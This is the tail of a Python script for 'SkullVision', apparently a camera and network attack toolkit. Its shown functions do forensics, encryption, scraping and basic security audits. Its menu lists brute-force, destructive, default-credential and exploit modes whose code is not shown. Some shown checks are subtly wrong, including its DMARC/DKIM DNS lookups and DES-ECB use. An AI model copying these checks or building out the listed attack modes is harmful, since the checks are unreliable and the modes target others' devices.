                    self.vis.info(f"  Suspicious string: {s}")
            except Exception as e:
                self.vis.warning(f"Analysis error: {e}")
            
            self.malware_samples.append({
                'path': file_path,
                'hash': file_hash,
                'analyzed': datetime.now().isoformat()
            })
            
            self.vis.success("Malware analysis completed")
        else:
            self.vis.error(f"File not found: {file_path}")
    
    def mode_forensics(self):
        self.vis.header("🕵️ FORENSICS MODE", "═", 70)
        target = input(f"{C}Enter target (IP or file path): {W}").strip()
        if target:
            self.vis.info(f"Running forensics on {target}")
            
            if os.path.exists(target):
                self.file_forensics(target)
            else:
                self.network_forensics(target)
            
            self.vis.success("Forensics completed")
    
    def file_forensics(self, file_path: str):
        try:
            stat = os.stat(file_path)
            self.vis.info(f"File: {file_path}")
            self.vis.info(f"Size: {stat.st_size} bytes")
            self.vis.info(f"Created: {datetime.fromtimestamp(stat.st_ctime)}")
            self.vis.info(f"Modified: {datetime.fromtimestamp(stat.st_mtime)}")
            self.vis.info(f"Accessed: {datetime.fromtimestamp(stat.st_atime)}")
            self.vis.info(f"Permissions: {oct(stat.st_mode)[-3:]}")
            self.vis.info(f"Owner: {stat.st_uid}:{stat.st_gid}")
            
            if stat.st_size < 1024 * 1024:
                with open(file_path, 'rb') as f:
                    content = f.read()
                self.vis.info(f"File signature: {content[:16].hex()}")
        except Exception as e:
            self.vis.warning(f"Forensics error: {e}")
    
    def network_forensics(self, ip: str):
        try:
            self.vis.info(f"Network forensics for {ip}")
            self.vis.info(f"Pinging {ip}...")
            response = subprocess.run(['ping', '-c', '4', ip], capture_output=True, text=True)
            if response.returncode == 0:
                self.vis.info(response.stdout)
            else:
                self.vis.warning("Ping failed")
            
            self.vis.info(f"Traceroute to {ip}...")
            response = subprocess.run(['traceroute', '-n', ip], capture_output=True, text=True)
            if response.returncode == 0:
                self.vis.info(response.stdout[:500])
        except Exception as e:
            self.vis.warning(f"Network forensics error: {e}")
    
    def mode_encryption_tools(self):
        self.vis.header("🔐 ENCRYPTION TOOLS", "═", 70)
        self.vis.info("Encryption/Decryption tools")
        
        print(f"""
{Y}Select encryption operation:{W}
{G}1.{W} AES-256 Encryption
{G}2.{W} AES-256 Decryption
{G}3.{W} RSA Key Generation
{G}4.{W} RSA Encryption
{G}5.{W} RSA Decryption
{G}6.{W} DES Encryption
{G}7.{W} DES Decryption
{G}8.{W} Hash File (MD5/SHA256)
""")
        choice = input(f"\n{C}Select operation (1-8): {W}").strip()
        
        if choice == '1':
            self.aes_encrypt()
        elif choice == '2':
            self.aes_decrypt()
        elif choice == '3':
            self.rsa_keygen()
        elif choice == '4':
            self.rsa_encrypt()
        elif choice == '5':
            self.rsa_decrypt()
        elif choice == '6':
            self.des_encrypt()
        elif choice == '7':
            self.des_decrypt()
        elif choice == '8':
            self.hash_file()
        else:
            self.vis.warning("Invalid choice")
    
    def aes_encrypt(self):
        if not CRYPTOGRAPHY_AVAILABLE:
            self.vis.warning("PyCryptodome not available")
            return
        try:
            data = input(f"{C}Enter data to encrypt: {W}").strip()
            key = get_random_bytes(32)
            cipher = AES.new(key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(data.encode())
            
            self.vis.success("AES-256 Encryption successful")
            self.vis.info(f"Key: {key.hex()}")
            self.vis.info(f"Ciphertext: {ciphertext.hex()}")
            self.vis.info(f"Nonce: {cipher.nonce.hex()}")
        except Exception as e:
            self.vis.error(f"Encryption failed: {e}")
    
    def aes_decrypt(self):
        if not CRYPTOGRAPHY_AVAILABLE:
            self.vis.warning("PyCryptodome not available")
            return
        try:
            key = bytes.fromhex(input(f"{C}Enter key (hex): {W}").strip())
            nonce = bytes.fromhex(input(f"{C}Enter nonce (hex): {W}").strip())
            ciphertext = bytes.fromhex(input(f"{C}Enter ciphertext (hex): {W}").strip())
            
            cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
            plaintext = cipher.decrypt(ciphertext)
            self.vis.success(f"Plaintext: {plaintext.decode()}")
        except Exception as e:
            self.vis.error(f"Decryption failed: {e}")
    
    def rsa_keygen(self):
        if not CRYPTOGRAPHY_AVAILABLE:
            self.vis.warning("PyCryptodome not available")
            return
        try:
            key = RSA.generate(2048)
            private_key = key.export_key()
            public_key = key.publickey().export_key()
            
            self.vis.success("RSA key generation successful")
            self.vis.info(f"Private key:\n{private_key.decode()}")
            self.vis.info(f"Public key:\n{public_key.decode()}")
        except Exception as e:
            self.vis.error(f"Key generation failed: {e}")
    
    def rsa_encrypt(self):
        if not CRYPTOGRAPHY_AVAILABLE:
            self.vis.warning("PyCryptodome not available")
            return
        try:
            public_key = RSA.import_key(input(f"{C}Enter public key: {W}").strip())
            data = input(f"{C}Enter data to encrypt: {W}").strip()
            cipher = PKCS1_OAEP.new(public_key)
            ciphertext = cipher.encrypt(data.encode())
            self.vis.success(f"Ciphertext: {ciphertext.hex()}")
        except Exception as e:
            self.vis.error(f"Encryption failed: {e}")
    
    def rsa_decrypt(self):
        if not CRYPTOGRAPHY_AVAILABLE:
            self.vis.warning("PyCryptodome not available")
            return
        try:
            private_key = RSA.import_key(input(f"{C}Enter private key: {W}").strip())
            ciphertext = bytes.fromhex(input(f"{C}Enter ciphertext (hex): {W}").strip())
            cipher = PKCS1_OAEP.new(private_key)
            plaintext = cipher.decrypt(ciphertext)
            self.vis.success(f"Plaintext: {plaintext.decode()}")
        except Exception as e:
            self.vis.error(f"Decryption failed: {e}")
    
    def des_encrypt(self):
        if not CRYPTOGRAPHY_AVAILABLE:
            self.vis.warning("PyCryptodome not available")
            return
        try:
            data = input(f"{C}Enter data to encrypt: {W}").strip()
            key = get_random_bytes(8)
            cipher = DES.new(key, DES.MODE_ECB)
            padded = pad(data.encode(), 8)
            ciphertext = cipher.encrypt(padded)
            self.vis.success("DES Encryption successful")
            self.vis.info(f"Key: {key.hex()}")
            self.vis.info(f"Ciphertext: {ciphertext.hex()}")
        except Exception as e:
            self.vis.error(f"Encryption failed: {e}")
    
    def des_decrypt(self):
        if not CRYPTOGRAPHY_AVAILABLE:
            self.vis.warning("PyCryptodome not available")
            return
        try:
            key = bytes.fromhex(input(f"{C}Enter key (hex): {W}").strip())
            ciphertext = bytes.fromhex(input(f"{C}Enter ciphertext (hex): {W}").strip())
            cipher = DES.new(key, DES.MODE_ECB)
            plaintext = unpad(cipher.decrypt(ciphertext), 8)
            self.vis.success(f"Plaintext: {plaintext.decode()}")
        except Exception as e:
            self.vis.error(f"Decryption failed: {e}")
    
    def hash_file(self):
        file_path = input(f"{C}Enter file path: {W}").strip()
        if file_path and os.path.exists(file_path):
            try:
                with open(file_path, 'rb') as f:
                    content = f.read()
                self.vis.info(f"MD5: {hashlib.md5(content).hexdigest()}")
                self.vis.info(f"SHA1: {hashlib.sha1(content).hexdigest()}")
                self.vis.info(f"SHA256: {hashlib.sha256(content).hexdigest()}")
                self.vis.info(f"SHA512: {hashlib.sha512(content).hexdigest()}")
            except Exception as e:
                self.vis.error(f"Hash failed: {e}")
        else:
            self.vis.error(f"File not found: {file_path}")
    
    def mode_file_analysis(self):
        self.vis.header("📁 FILE ANALYSIS", "═", 70)
        file_path = input(f"{C}Enter file path to analyze: {W}").strip()
        if file_path and os.path.exists(file_path):
            self.vis.info(f"Analyzing file: {file_path}")
            
            try:
                stat = os.stat(file_path)
                self.vis.info(f"Size: {stat.st_size} bytes")
                self.vis.info(f"Type: {'Directory' if os.path.isdir(file_path) else 'File'}")
                self.vis.info(f"Permissions: {oct(stat.st_mode)[-3:]}")
                
                if os.path.isfile(file_path):
                    with open(file_path, 'rb') as f:
                        content = f.read()
                    
                    if content[:4] == b'%PDF':
                        self.vis.info("File type: PDF")
                    elif content[:2] == b'MZ':
                        self.vis.info("File type: PE (Windows executable)")
                    elif content[:4] == b'\x7fELF':
                        self.vis.info("File type: ELF (Linux executable)")
                    elif content[:8] == b'PK\x03\x04':
                        self.vis.info("File type: ZIP archive")
                    elif content[:4] == b'GIF8':
                        self.vis.info("File type: GIF image")
                    elif content[:8] == b'\x89PNG\r\n\x1a\n':
                        self.vis.info("File type: PNG image")
                    elif content[:3] == b'ID3':
                        self.vis.info("File type: MP3 audio")
                    else:
                        self.vis.info("File type: Unknown")
                    
                    self.vis.info(f"File hash: {hashlib.md5(content).hexdigest()}")
                    self.vis.info(f"File hash (SHA256): {hashlib.sha256(content).hexdigest()}")
            except Exception as e:
                self.vis.warning(f"Analysis error: {e}")
            
            self.vis.success("File analysis completed")
        else:
            self.vis.error(f"File not found: {file_path}")
    
    def mode_web_scraping(self):
        self.vis.header("🌐 WEB SCRAPING", "═", 70)
        url = input(f"{C}Enter URL to scrape: {W}").strip()
        if url:
            self.vis.info(f"Scraping: {url}")
            
            try:
                response = self.session.get(url, timeout=HTTP_TIMEOUT)
                if response.status_code == 200:
                    self.vis.info(f"Status: 200 OK")
                    self.vis.info(f"Content-Type: {response.headers.get('Content-Type', 'unknown')}")
                    
                    if BEAUTIFULSOUP_AVAILABLE:
                        soup = BeautifulSoup(response.text, 'html.parser')
                        self.vis.info(f"Title: {soup.title.string if soup.title else 'No title'}")
                        self.vis.info(f"Links: {len(soup.find_all('a'))}")
                        self.vis.info(f"Images: {len(soup.find_all('img'))}")
                        self.vis.info(f"Paragraphs: {len(soup.find_all('p'))}")
                        
                        meta_desc = soup.find('meta', attrs={'name': 'description'})
                        if meta_desc:
                            self.vis.info(f"Description: {meta_desc.get('content', '')[:100]}")
                    else:
                        self.vis.info(f"Content length: {len(response.text)} bytes")
                else:
                    self.vis.warning(f"HTTP {response.status_code}")
            except Exception as e:
                self.vis.error(f"Scraping failed: {e}")
            
            self.vis.success("Web scraping completed")
    
    def mode_email_security(self):
        self.vis.header("📧 EMAIL SECURITY", "═", 70)
        domain = input(f"{C}Enter domain to check: {W}").strip()
        if domain:
            self.vis.info(f"Checking email security for {domain}")
            
            try:
                if DNS_AVAILABLE:
                    for record_type in ['MX', 'SPF', 'DMARC', 'DKIM']:
                        try:
                            answers = dns.resolver.resolve(domain, record_type)
                            self.vis.info(f"{record_type}: {answers[0].to_text()}")
                        except:
                            self.vis.warning(f"No {record_type} record found")
                else:
                    self.vis.warning("DNS module not available")
            except Exception as e:
                self.vis.warning(f"Email security check failed: {e}")
            
            self.vis.success("Email security check completed")
    
    def mode_password_analysis(self):
        self.vis.header("🔑 PASSWORD ANALYSIS", "═", 70)
        password = input(f"{C}Enter password to analyze: {W}").strip()
        if password:
            self.vis.info("Analyzing password strength")
            
            strength = 0
            if len(password) >= 8:
                strength += 1
            if len(password) >= 12:
                strength += 1
            if any(c.isupper() for c in password):
                strength += 1
            if any(c.islower() for c in password):
                strength += 1
            if any(c.isdigit() for c in password):
                strength += 1
            if any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?/' for c in password):
                strength += 1
            if len(set(password)) >= 6:
                strength += 1
            
            if strength <= 2:
                self.vis.error("Password strength: WEAK")
            elif strength <= 4:
                self.vis.warning("Password strength: MEDIUM")
            elif strength <= 6:
                self.vis.info("Password strength: STRONG")
            else:
                self.vis.success("Password strength: VERY STRONG")
            
            self.vis.info(f"Length: {len(password)} characters")
            self.vis.info(f"Character types: {strength}/7 criteria met")
            
            self.vis.success("Password analysis completed")
    
    def mode_security_audit(self):
        self.vis.header("🛡️ SECURITY AUDIT", "═", 70)
        target = input(f"{C}Enter target (IP or domain): {W}").strip()
        if target:
            self.vis.info(f"Running security audit for {target}")
            
            self.audit_network_security(target)
            self.audit_web_security(target)
            self.audit_server_security(target)
            
            self.vis.success("Security audit completed")
    
    def audit_network_security(self, target: str):
        self.vis.subheader("Network Security Audit", 2)
        ip, port = self.parse_target(target)
        if ip:
            open_ports, _ = self.scan_ports_complete(ip, port)
            self.vis.info(f"Open ports: {len(open_ports)}")
            
            dangerous_ports = [21, 23, 25, 80, 443, 445, 3389, 3306, 5432, 6379, 27017]
            open_dangerous = [p for p in open_ports if p in dangerous_ports]
            if open_dangerous:
                self.vis.warning(f"Dangerous ports open: {open_dangerous}")
            else:
                self.vis.success("No dangerous ports open")
    
    def audit_web_security(self, target: str):
        self.vis.subheader("Web Security Audit", 2)
        ip, port = self.parse_target(target)
        if ip:
            try:
                protocol = "https" if port in HTTPS_PORTS else "http"
                url = f"{protocol}://{ip}:{port if port else 80}"
                response = self.session.get(url, timeout=HTTP_TIMEOUT)
                
                security_headers = ['X-Frame-Options', 'X-Content-Type-Options', 'X-XSS-Protection', 'Content-Security-Policy', 'Strict-Transport-Security']
                for header in security_headers:
                    if header in response.headers:
                        self.vis.success(f"{header}: Present")
                    else:
                        self.vis.warning(f"{header}: Missing")
            except:
                self.vis.warning("Web security audit failed")
    
    def audit_server_security(self, target: str):
        self.vis.subheader("Server Security Audit", 2)
        ip, port = self.parse_target(target)
        if ip:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(2)
                    sock.connect((ip, port if port else 80))
                    banner = self.get_banner_complete(ip, port if port else 80)
                    if banner:
                        self.vis.info(f"Server banner: {banner[:100]}")
                        if any(version in banner.lower() for version in ['2.2', '2.0', '1.0', '0.9', 'old']):
                            self.vis.warning("Potentially outdated server software")
            except:
                pass
    
    def mode_performance_monitor(self):
        self.vis.header("📊 PERFORMANCE MONITOR", "═", 70)
        self.vis.info("Monitoring system performance")
        
        try:
            cpu = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            network = psutil.net_io_counters()
            
            self.vis.info(f"CPU Usage: {cpu}%")
            self.vis.info(f"Memory: {memory.used / (1024**3):.2f}GB / {memory.total / (1024**3):.2f}GB ({memory.percent}%)")
            self.vis.info(f"Disk: {disk.used / (1024**3):.2f}GB / {disk.total / (1024**3):.2f}GB ({disk.percent}%)")
            self.vis.info(f"Network Sent: {network.bytes_sent / (1024**2):.2f}MB")
            self.vis.info(f"Network Received: {network.bytes_recv / (1024**2):.2f}MB")
            
            if cpu > 80:
                self.vis.warning("High CPU usage detected")
            if memory.percent > 90:
                self.vis.warning("High memory usage detected")
            if disk.percent > 90:
                self.vis.warning("Low disk space")
        except Exception as e:
            self.vis.warning(f"Performance monitoring failed: {e}")
        
        self.vis.success("Performance monitor completed")
    
    def mode_health_check(self):
        self.vis.header("🔄 HEALTH CHECK", "═", 70)
        self.vis.info("Checking system health and dependencies")
        
        deps = {
            'requests': REQUESTS_AVAILABLE,
            'beautifulsoup4': BEAUTIFULSOUP_AVAILABLE,
            'paramiko': PARAMIKO_AVAILABLE,
            'pyshark': PYSHARK_AVAILABLE,
            'mysql-connector': MYSQL_AVAILABLE,
            'psycopg2': POSTGRES_AVAILABLE,
            'pymongo': MONGODB_AVAILABLE,
            'redis': REDIS_AVAILABLE,
            'smbclient': SMB_AVAILABLE,
            'pysnmp': SNMP_AVAILABLE
        }
        
        installed = sum(1 for v in deps.values() if v)
        total = len(deps)
        
        self.vis.info(f"Dependencies: {installed}/{total} installed")
        for dep, available in deps.items():
            status = f"{G}✅" if available else f"{R}❌"
            print(f"  {status} {dep}")
        
        self.vis.info(f"Root privileges: {'✅' if self.is_root else '❌'}")
        self.vis.info(f"Directories: {'✅' if BASE_DIR.exists() else '❌'}")
        self.vis.info(f"Total activities: {self.total_activities}")
        self.vis.info(f"Activities executed: {len(self.scan_data['activities'])}")
        
        self.vis.success("Health check completed")
    
    def run(self, target: Optional[str] = None):
        self.print_banner()
        self.start_time = time.time()
        
        self._initialize_directories()
        
        if target:
            ip, port = self.parse_target(target)
            if ip:
                self.target_ip = ip
                self.target_port = port
                self.vis.header(f"🎯 TARGET: {ip}" + (f":{port}" if port else ""))
                self.mode_full_assessment(target)
                return
        
        while True:
            try:
                choice = self.show_main_menu()
                
                if choice == '0':
                    self.vis.info("Exiting...")
                    break
                elif choice == '1':
                    self.mode_full_assessment()
                elif choice == '2':
                    self.mode_cctv_scanner()
                elif choice == '3':
                    self.mode_bruteforce()
                elif choice == '4':
                    self.mode_ghost()
                elif choice == '5':
                    self.mode_cyborg()
                elif choice == '6':
                    self.mode_destructive()
                elif choice == '7':
                    self.mode_onvif_discovery()
                elif choice == '8':
                    self.mode_single_target()
                elif choice == '9':
                    self.mode_interactive_shell()
                elif choice == '10':
                    self.mode_cve_scanner()
                elif choice == '11':
                    self.mode_vulnerability_scanner()
                elif choice == '12':
                    self.mode_report_generator()
                elif choice == '13':
                    self.mode_cache_management()
                elif choice == '14':
                    self.mode_rtsp_finder()
                elif choice == '15':
                    self.mode_network_recon()
                elif choice == '16':
                    self.mode_service_scanner()
                elif choice == '17':
                    self.mode_camera_detector()
                elif choice == '18':
                    self.mode_default_credential_tester()
                elif choice == '19':
                    self.mode_osint_gathering()
                elif choice == '20':
                    self.mode_batch_scan()
                elif choice == '21':
                    self.mode_exploit_database()
                elif choice == '22':
                    self.mode_show_activities()
                elif choice == '23':
                    self.mode_update_database()
                elif choice == '24':
                    self.mode_cleanup()
                elif choice == '25':
                    self.mode_packet_analysis()
                elif choice == '26':
                    self.mode_malware_analysis()
                elif choice == '27':
                    self.mode_forensics()
                elif choice == '28':
                    self.mode_encryption_tools()
                elif choice == '29':
                    self.mode_file_analysis()
                elif choice == '30':
                    self.mode_web_scraping()
                elif choice == '31':
                    self.mode_email_security()
                elif choice == '32':
                    self.mode_password_analysis()
                elif choice == '33':
                    self.mode_security_audit()
                elif choice == '34':
                    self.mode_performance_monitor()
                elif choice == '35':
                    self.mode_health_check()
                else:
                    self.vis.warning("Invalid selection. Please try again.")
                
                if choice != '0':
                    input(f"\n{G}Press ENTER to continue...{W}")
                    
            except KeyboardInterrupt:
                self.vis.info("\nOperation interrupted")
                continue
            except Exception as e:
                self.vis.error(f"Error: {e}")
                traceback.print_exc()
                continue

def main():
    try:
        tool = SkullVision()
        
        if len(sys.argv) > 1:
            target = sys.argv[1]
            tool.run(target)
        else:
            tool.run()
            
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted by user{W}")
        sys.exit(1)
    except Exception as e:
        print(f"{R}[!] Error: {e}{W}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
